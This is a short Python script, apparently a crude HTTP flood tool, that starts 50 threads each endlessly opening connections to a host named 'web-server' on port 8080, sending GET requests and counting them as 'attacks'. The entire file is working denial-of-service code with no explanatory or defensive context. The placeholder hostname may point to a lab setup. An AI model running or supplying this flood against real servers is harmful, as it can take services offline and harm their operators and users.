import socket
import threading

target = 'web-server'
port = 8080

attack_num = 0

def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(("GET / HTTP/1.1\r\nHost:" + target + "\r\n\r\n").encode('ascii'))

    global attack_num
    attack_num += 1
    print(attack_num)
    
    s.close()

for i in range(50):
  thread = threading.Thread(target=attack)
  thread.start()